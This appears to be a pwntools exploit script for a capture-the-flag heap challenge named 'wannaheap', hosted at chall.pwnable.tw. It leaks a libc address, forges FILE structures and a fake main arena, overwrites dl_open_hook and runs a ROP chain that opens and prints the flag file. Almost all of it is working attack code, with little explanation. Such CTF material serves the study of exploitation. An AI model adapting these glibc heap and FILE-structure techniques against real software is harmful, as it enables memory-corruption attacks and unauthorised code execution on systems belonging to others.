###WTF, I have completely no idea what I have done, should come back and recheck later

from pwn import *
from IO_FILE import *


###structure
'''
A = rand()
size = assigned + A%0x217 + A%0x2170
structure

pointers to A%217 stored at mmaped space
at most 0x80 blocks

0xDA ...
    |   4   |   4   |   4   |   4   |
0x00|   left_child  |  right_child  |
0x10|      key      |    data_ptr   |
0x20|randval|   x   |
0x42 ...
'''

###Util
def create(key,data):
    r.sendafter('> ','A')
    r.sendafter('key :',key)
    r.sendafter('data :',data)

def show(key):
    r.sendafter('> ','R')
    r.sendafter('key:',key)
    return r.recvline()[7:-1]

###Constant
mmap_size = 0x314000

###Addr
#  libc2.24
stdin_struct_offset = 0x3c18c0
stdin_buf_base_offset = stdin_struct_offset+0x38
stdin_lock_offset = 0x3c3770
stdout_struct_offset = 0x3c2600
dl_open_hook_offset = 0x3c62e0
IO_file_jumps_offset = 0x3be400

###ROPgadget
L_nop = 0x10f80
L_pop_rdi = 0x1fd7a
L_pop_rsi = 0x1fcbd
L_pop_rdx = 0x1b92
L_pop_rax = 0x3a998
L_syscall = 0xbc765
setcontext_gadget = 0x48045
L_set_call = 0x6ebbb  # mov rdi, rax ; call [rax+0x20]


###Exploit
while True:
    r = remote('chall.pwnable.tw',10305)

    r.sendlineafter('Size :',str(mmap_size-0x10+stdin_buf_base_offset))
    r.sendlineafter('Size :',str(0x313370))
    r.sendlineafter('Content :','M30W')

    create('Z','M30W')
    create(b'1\x89','a'*0x9)

    try:
        stdout_struct_addr = u64(b'\x00'+show(b'1\x89')[9:]+b'\x00\x00')
        libc_base = stdout_struct_addr-stdout_struct_offset
        print(hex(libc_base))
        break
    except:
        r.close()
        continue

r.send('R')
r.send(p64(libc_base+stdin_buf_base_offset+0x1200))

IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(buf_end = libc_base+stdin_buf_base_offset+0x1200,
                           lock = libc_base+stdin_lock_offset,
                           mode = 0xffffffff,
                           vtable = libc_base+IO_file_jumps_offset)
stream = stream[0x40:]
fake_chunk = p64(0)+p64(0x3f1)+p64(0)+p64(libc_base+dl_open_hook_offset-0x10)+b'AZ\x00\x00\x00\x00\x00\x00'
ROPchain = p64(libc_base+L_pop_rdi)+p64(libc_base+stdin_struct_offset+0x1e0)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rdx)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(2)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(1)+\
           p64(libc_base+L_pop_rsi)+p64(libc_base+stdin_struct_offset+0x1e0)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(0)+\
           p64(libc_base+L_pop_rsi)+p64(libc_base+stdin_struct_offset+0x1e0)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(1)+\
           p64(libc_base+L_syscall)
argument = b'/proc/self/maps\x00'
argument = b'/home/wannaheap/flag\x00'

func_ptrs = p64(libc_base+0x3bdec0)+p64(0)+p64(libc_base+0x88680)+p64(libc_base+0x88260)+p64(0)+p64(0)
fake_main_arena = p32(0)+p32(1)+p64(0)*10+p64(libc_base+L_set_call)+p64(0)+p64(libc_base+stdin_struct_offset+0xe0)+p64(libc_base+stdin_struct_offset+0xe0)
fake_frame = p64(libc_base+setcontext_gadget)+p64(0)*15+p64(libc_base+stdin_struct_offset+0x108)+p64(libc_base+L_nop)

payload = stream+fake_chunk+(ROPchain+argument).ljust(0x108,b'\x00')+func_ptrs+fake_main_arena+fake_frame
sleep(1)
r.send(payload)

r.interactive()
